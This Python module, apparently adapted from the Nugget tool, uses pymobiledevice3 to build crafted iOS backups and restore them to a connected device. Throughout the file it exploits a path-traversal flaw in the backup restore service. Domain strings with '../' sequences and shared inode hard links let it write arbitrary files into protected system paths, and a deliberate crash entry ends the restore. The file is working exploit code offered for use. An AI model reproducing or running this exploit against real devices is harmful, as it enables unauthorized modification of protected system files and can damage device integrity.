from . import backup, perform_restore
from pymobiledevice3.lockdown import create_using_usbmux

# skidded from Nugget
class FileToRestore:
    def __init__(self, contents: str, restore_path: str, restore_name: str, owner: int = 501, group: int = 501):
        self.contents = contents
        self.restore_path = restore_path
        self.restore_name = restore_name
        self.owner = owner
        self.group = group

# files is a list of FileToRestore objects
def restore_files(files: list):
    # create the files to be backed up
    files_list = [
        backup.Directory("", "RootDomain"),
        backup.Directory("Library", "RootDomain"),
        backup.Directory("Library/Preferences", "RootDomain"),
    ]
    # create the links
    for file_num in range(len(files)):
        files_list.append(backup.ConcreteFile(
                f"Library/Preferences/temp{file_num}",
                "RootDomain",
                owner=files[file_num].owner,
                group=files[file_num].group,
                contents=files[file_num].contents,
                inode=file_num
            ))
    # add the file paths
    for file_num in range(len(files)):
        file = files[file_num]
        files_list.append(backup.Directory(
            "",
            f"SysContainerDomain-../../../../../../../../var/backup{file.restore_path}",
            owner=file.owner,
            group=file.group
        ))
        files_list.append(backup.ConcreteFile(
            "",
            f"SysContainerDomain-../../../../../../../../var/backup{file.restore_path}{file.restore_name}",
            owner=file.owner,
            group=file.group,
            contents=b"",
            inode=file_num
        ))
    # break the hard links
    for file_num in range(len(files)):
        files_list.append(backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp{file_num}",
                owner=501,
                group=501,
                contents=b"",
            ))  # Break the hard link
    files_list.append(backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""))

    # create the backup
    back = backup.Backup(files=files_list)

    perform_restore(backup=back)


def restore_file(fp: str, restore_path: str, restore_name: str):
    # open the file and read the contents
    contents = open(fp, "rb").read()

    # create the backup
    back = backup.Backup(files=[
        backup.Directory("", "RootDomain"),
        backup.Directory("Library", "RootDomain"),
        backup.Directory("Library/Preferences", "RootDomain"),
        backup.ConcreteFile("Library/Preferences/temp", "RootDomain", owner=501, group=501, contents=contents, inode=0),
        backup.Directory(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup{restore_path}",
                owner=501,
                group=501
            ),
        backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup{restore_path}{restore_name}",
                owner=501,
                group=501,
                contents=b"",
                inode=0
            ),
        backup.ConcreteFile(
                "",
                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
                owner=501,
                group=501,
                contents=b"",
            ),  # Break the hard link
            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
    ])

    
    perform_restore(backup=back)